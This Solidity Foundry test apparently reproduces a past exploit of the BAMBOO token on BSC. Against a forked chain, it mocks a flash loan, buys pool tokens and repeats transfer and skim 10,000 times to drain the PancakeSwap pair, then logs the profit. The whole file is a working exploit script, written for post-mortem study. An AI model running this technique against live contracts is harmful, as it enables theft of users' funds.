// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~200BNB
// Attacker : 0x00703face6621bd207d3b4ac9867058190c0bb09
// Attack Contract : 0xcdf0eb202cfd1f502f3fdca9006a4b5729aadebc
// Vulnerable Contract : 0xed56784bc8f2c036f6b0d8e04cb83c253e4a6a94
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x88a6c2c3ce86d4e0b1356861b749175884293f4302dbfdbfb16a5e373ab58a10
// Block: 29668034

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xed56784bc8f2c036f6b0d8e04cb83c253e4a6a94

// @Analysis
// Post-mortem : https://twitter.com/Phalcon_xyz/status/1676220090142916611

// @POC Author : https://twitter.com/eugenioclrc

contract BambooTest is Test {
    IERC20 wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 bamboo = IERC20(0xED56784bC8F2C036f6b0D8E04Cb83C253e4a6A94);

    IPancakePair wbnbBambooPair = IPancakePair(0x0557713d02A15a69Dea5DD4116047e50F521C1b1);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IUniswapV2Factory factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_668_034);

        vm.label(address(wbnb), "WBNB");
        vm.label(address(bamboo), "BAMBOO");
        vm.label(address(router), "PancakeRouter");
    }

    function toEth(uint256 _wei) internal returns (string memory) {
        string memory eth = vm.toString(_wei / 1 ether);
        string memory decs = vm.toString(_wei % 1 ether);

        string memory result = string.concat(string.concat(eth, "."), decs);

        return result;
    }

    function testExploit() public {
        // get a flash loan (lets mock it out)
        deal(address(wbnb), address(this), 4000 ether);

        console.log("start balance after flashloan", toEth(wbnb.balanceOf(address(this))));

        uint256 bambooBalance = bamboo.balanceOf(address(wbnbBambooPair));

        address[] memory path;
        path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bamboo);
        uint256[] memory amounts = router.getAmountsIn(bambooBalance * 9 / 10, path);

        wbnb.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokens(amounts[1], 0, path, address(this), block.timestamp);

        uint256 max = 10_000;
        for (uint256 i; i < max; ++i) {
            bamboo.transfer(address(wbnbBambooPair), 1_343_870_967_101_818_317);
            wbnbBambooPair.skim(address(this));
        }

        path[0] = address(bamboo);
        path[1] = address(wbnb);
        bamboo.approve(address(router), type(uint256).max);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bamboo.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        console.log("profit after return flashloan", toEth(wbnb.balanceOf(address(this)) - 4000 ether));
    }
}
